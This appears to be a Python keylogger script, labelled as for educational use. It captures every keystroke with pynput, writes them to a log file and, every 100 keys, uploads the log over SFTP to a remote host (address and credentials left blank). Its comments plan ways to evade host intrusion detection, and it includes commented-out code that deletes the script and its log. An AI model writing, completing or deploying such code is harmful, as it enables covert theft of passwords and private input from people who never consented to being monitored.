from pynput.keyboard import Listener
import logging
import pysftp
import random
import schedule
import time
import os

# author: ggarcz1
# NOTE: You are free to copy, edit, and use this code for EDUCATIONAL purposes only.
# Authors and any contributors bear no responsibility for how you use this code!

def fake_source_ip():
    source = '.'.join(str(random.randint(0, 255)) for _ in range(0, 4))
    return source[:-1]

# must be on the harddrive not in an obscure folder to work
# set config for the logging module
logging.basicConfig(filename=("" + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

# over SFTP
def send_file():
    remote_host = ''
    remote_host_username = ''
    remote_host_password = ''
    with pysftp.Connection(host=remote_host, username = remote_host_username, password = remote_host_password) as sftp:
        sftp.put('keylogs.txt')

def get_mac():
    exe_string = 'ipconfig'
    return 

def search_odd_keys(key):
    if key == '0e':
        return 'Shift Left'
    elif key == '0f':
        return 'Shift Right'
    
    return key

# action when a key is pressed
def on_press(key):
    value = search_odd_keys(key)
    logging.info(str(value))
    # every 100 keys, send log file
    # after 5 min of no activity, send it and reset counter to 0
    # wipe local file so it doenst get huge and set off HIDS
    # if counter == 0 when 5 minutes hits, dont push, reset timer
    # schedule.every(10).minutes.do(send_file)

    global counter
    if counter == 100:
        send_file()
        counter = 0
    else:
        counter += 1

# code that actually runs here
global counter
counter = 0
with Listener(on_press=on_press) as listener:
    listener.join()


# # delete files after X amount of days
# init_time = time.localtime()
# # dynamic updates below
# current_time = time.localtime()

# os.remove('logger.py')
# os.remove('keylogs.txt')